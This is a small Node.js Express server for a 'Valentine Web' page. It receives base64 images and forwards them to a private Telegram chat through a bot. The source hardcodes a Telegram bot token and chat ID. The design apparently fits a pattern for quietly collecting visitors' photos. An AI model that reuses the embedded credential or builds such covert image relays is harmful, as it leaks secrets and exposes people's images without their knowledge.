const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
app.use(bodyParser.json({limit:'10mb'})); // cho ảnh base64 lớn

const TELEGRAM_TOKEN = '8687534107:AAGBGRR74rfjYGeoV2erjk01piWdMCePMps';
const CHAT_ID = '8202147321';

app.post('/upload', async (req, res) => {
  try {
    const { image } = req.body;
    if (!image) return res.status(400).send('No image');

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        photo: image,
        caption: 'Ảnh từ Valentine Web 💖'
      })
    });

    res.send({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).send('Error sending photo');
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Server running on port ${port}`));
